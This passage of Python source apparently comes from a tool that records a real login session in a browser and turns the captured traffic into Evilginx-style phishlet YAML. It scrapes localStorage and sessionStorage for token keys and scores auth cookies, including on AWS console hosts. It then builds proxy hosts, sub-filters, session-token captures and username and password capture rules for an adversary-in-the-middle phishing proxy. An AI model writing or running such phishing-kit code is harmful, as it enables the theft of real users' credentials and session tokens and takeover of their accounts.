            storage = await self.page.evaluate(
                """() => {
  const ls = {};
  const ss = {};
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      ls[k] = localStorage.getItem(k);
    }
  } catch (e) {}

  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      ss[k] = sessionStorage.getItem(k);
    }
  } catch (e) {}

  return { localStorage: ls, sessionStorage: ss };
}
"""
            )
            if isinstance(storage, dict):
                self.storage_state['localStorage'] = storage.get('localStorage', {}) or {}
                self.storage_state['sessionStorage'] = storage.get('sessionStorage', {}) or {}
                self.storage_state['captured_at'] = datetime.now().isoformat()

                tokenish = []
                for container_name in ['localStorage', 'sessionStorage']:
                    container = self.storage_state.get(container_name, {}) or {}
                    for k in container.keys():
                        kl = str(k).lower()
                        if any(t in kl for t in ['token', 'jwt', 'bearer', 'access', 'refresh', 'id_token', 'saml']):
                            tokenish.append(f"{container_name}:{k}")
                self.auth_evidence['storage_token_keys'] = sorted(set(tokenish))
        except Exception:
            return

    def _compute_auth_observed(self, result: LiveAnalysisResult) -> tuple[bool, Dict[str, Any]]:
        """Compute whether authentication appears to have occurred.

        This does *not* mean capture can stop automatically; it is only UI feedback.
        """
        evidence: Dict[str, Any] = {
            'post_login_url_hits': list(self.auth_evidence.get('post_login_url_hits', [])),
            'storage_token_keys': list(self.auth_evidence.get('storage_token_keys', [])),
            'auth_cookie_domains': {},
        }

        # Cookie evidence: any cookies on known auth domains OR presence of typical auth cookie names
        auth_cookie_domains = {}
        for domain, cookies in (result.cookies_captured or {}).items():
            if not isinstance(cookies, dict) or not cookies:
                continue
            score = 0
            for cname in cookies.keys():
                cl = str(cname).lower()
                if any(x in cl for x in ['sess', 'session', 'token', 'auth', 'jwt', 'saml', 'signin']):
                    score += 1
            if score > 0 or len(cookies) >= 3:
                auth_cookie_domains[domain] = {
                    'cookie_count': len(cookies),
                    'tokenish_cookie_hits': score,
                }

        evidence['auth_cookie_domains'] = auth_cookie_domains

        # Combine signals
        has_post_login = len(evidence['post_login_url_hits']) > 0
        has_auth_cookies = len(auth_cookie_domains) > 0
        has_storage_tokens = len(evidence['storage_token_keys']) > 0

        auth_observed = has_post_login or (has_auth_cookies and (has_post_login or has_storage_tokens))
        return auth_observed, evidence
    
    def generate_phishlet_yaml(self, phishlet_name: Optional[str] = None) -> str:
        """
        Generate phishlet YAML from captured traffic
        
        Args:
            phishlet_name: Optional name for the phishlet
        
        Returns:
            YAML string
        """
        if not phishlet_name:
            phishlet_name = self.target_domain.split('.')[0] if self.target_domain else 'generated'

        # Use dynamic generator if available
        if DYNAMIC_GENERATOR_AVAILABLE and INTELLIGENT_MODULES_AVAILABLE:
            try:
                traffic_data = {
                    'all_requests': self.requests_log,
                    'all_responses': self.responses_log,
                    'form_submissions': self.form_submissions,
                    'unique_hosts': list(self.unique_hosts),
                    'cookies_captured': self.cookies_by_domain,
                    'storage_state': self.storage_state,
                    'detected_proxy_hosts': self._detect_proxy_hosts(),
                    'detected_auth_tokens': self._detect_auth_tokens(),
                    'detected_login_url': self._detect_login_url()
                }
                # Ensure target_domain is a string
                target_domain = self.target_domain or 'example.com'
                result = generate_phishlet(target_domain, traffic_data, phishlet_name)
                return result.phishlet_yaml
            except Exception as e:
                print(f"[!] Dynamic generation failed, falling back to legacy: {e}")
        
        # Build proxy_hosts
        proxy_hosts = []
        for host_data in self._detect_proxy_hosts():
            proxy_host = {
                'phish_sub': host_data['orig_sub'] or 'www',
                'orig_sub': host_data['orig_sub'] or 'www',
                'domain': host_data['domain'],
                'session': host_data['has_session_cookies'],
                'is_landing': host_data['is_landing']
            }
            proxy_hosts.append(proxy_host)
        
        # Build sub_filters
        sub_filters = []
        for host_data in self._detect_proxy_hosts():
            orig_sub = host_data['orig_sub'] or 'www'
            domain = host_data['domain']
            trigger = f"{orig_sub}.{domain}" if orig_sub else domain
            
            sub_filters.append({
                'triggers_on': trigger,
                'orig_sub': orig_sub,
                'domain': domain,
                'search': '{hostname}',
                'replace': '{hostname}',
                'mimes': ['text/html', 'application/json', 'application/javascript']
            })
        
        # Build auth_tokens
        auth_tokens = self._detect_auth_tokens()
        for token in auth_tokens:
            if '.*,regexp' not in token['keys']:
                token['keys'].append('.*,regexp')
        
        # Build credentials
        credentials = {
            'username': {
                'key': 'username',
                'search': '(.*)',
                'type': 'post'
            },
            'password': {
                'key': 'password',
                'search': '(.*)',
                'type': 'post'
            }
        }
        
        # Update from form submissions
        if self.form_submissions:
            form = self.form_submissions[0]
            if form.get('detected_username_field'):
                credentials['username']['key'] = form['detected_username_field']
            if form.get('detected_password_field'):
                credentials['password']['key'] = form['detected_password_field']
        
        # Build login config
        login_url = self._detect_login_url()
        parsed_login = urlparse(login_url)
        
        login = {
            'domain': self.target_domain or 'example.com',
            'path': parsed_login.path or '/'
        }
        
        # Build phishlet
        phishlet = {
            'min_ver': '3.3.0',
            'proxy_hosts': proxy_hosts,
            'sub_filters': sub_filters,
            'auth_tokens': auth_tokens,
            'credentials': credentials,
            'login': login
        }
        
        return yaml.dump(phishlet, default_flow_style=False, sort_keys=False, allow_unicode=True)


class LiveAnalysisSession:
    """
    Manages a live analysis session with status tracking
    Compatible with Flask app.py endpoints
    """
    
    def __init__(self, session_id: str, headless: bool = False):
        """
        Initialize session
        
        Args:
            session_id: Unique session identifier
            headless: Whether to run browser in headless mode
        """
        self.session_id = session_id
        self.headless = headless
        self.target_url = None
        self.status = 'pending'  # pending, running, waiting_for_auth, analyzing, completed, error
        self.result = None
        self.error = None
        self.created_at = datetime.now()
        self.analyzer = LiveTrafficAnalyzer(headless=headless)
    
    async def start(self, target_url: str):
        """
        Start the analysis session
        
        Args:
            target_url: URL to analyze
        """
        try:
            self.target_url = target_url
            self.status = 'running'
            await self.analyzer.start_browser(target_url)
            self.status = 'waiting_for_auth'
        except Exception as e:
            self.status = 'error'
            self.error = str(e)
            raise
    
    async def stop_and_analyze(self) -> LiveAnalysisResult:
        """
        Stop the browser and analyze captured traffic
        
        Returns:
            LiveAnalysisResult with analysis
        """
        try:
            self.status = 'analyzing'
            await self.analyzer.stop_browser()
            self.result = self.analyzer._build_result()
            self.status = 'completed'
            return self.result
        except Exception as e:
            self.status = 'error'
            self.error = str(e)
            raise
    
    def get_status(self) -> Dict:
        """Get session status"""
        # Best-effort live auth detection signals (updated while running)
        # We avoid expensive operations here.
        post_login_hits = bool(self.analyzer.auth_evidence.get('post_login_url_hits'))
        # Fallback heuristic: if we are seeing AWS console hosts being hit, auth is very likely done.
        aws_console_hosts = any(
            'console.aws.amazon.com' in host
            for host in (self.analyzer.unique_hosts or set())
        )

        # If we have any credential-like form submissions, auth is likely underway.
        has_forms = len(self.analyzer.form_submissions) > 0

        # Detect auth-ish cookies captured mid-session.
        has_auth_cookies = False
        for domain, cookies in (self.analyzer.cookies_by_domain or {}).items():
            if not isinstance(cookies, dict):
                continue
            for cname in cookies.keys():
                cl = str(cname).lower()
                if any(x in cl for x in ['sess', 'session', 'token', 'auth', 'jwt', 'saml', 'signin']):
                    has_auth_cookies = True
                    break
            if has_auth_cookies:
                break

        auth_observed = post_login_hits or aws_console_hosts or has_forms or has_auth_cookies

        return {
            'session_id': self.session_id,
            'target_url': self.target_url,
            'status': self.status,
            'error': self.error,
            'created_at': self.created_at.isoformat(),
            'requests_captured': len(self.analyzer.requests_log),
            'responses_captured': len(self.analyzer.responses_log),
            'form_submissions': len(self.analyzer.form_submissions),
            'unique_hosts': len(self.analyzer.unique_hosts),
            'cookies_captured': sum(len(c) for c in self.analyzer.cookies_by_domain.values()),
            'auth_observed': auth_observed,
            'auth_evidence': {
                'post_login_url_hits': self.analyzer.auth_evidence.get('post_login_url_hits', [])[:5],
                'storage_token_keys': self.analyzer.auth_evidence.get('storage_token_keys', [])[:10],
                'aws_console_hosts_observed': aws_console_hosts,
            },
        }
    
    def generate_phishlet(self, phishlet_name: Optional[str] = None) -> str:
        """
        Generate phishlet YAML from session results
        
        Args:
            phishlet_name: Optional name for the phishlet
        
        Returns:
            YAML string
        """
        return self.analyzer.generate_phishlet_yaml(phishlet_name)
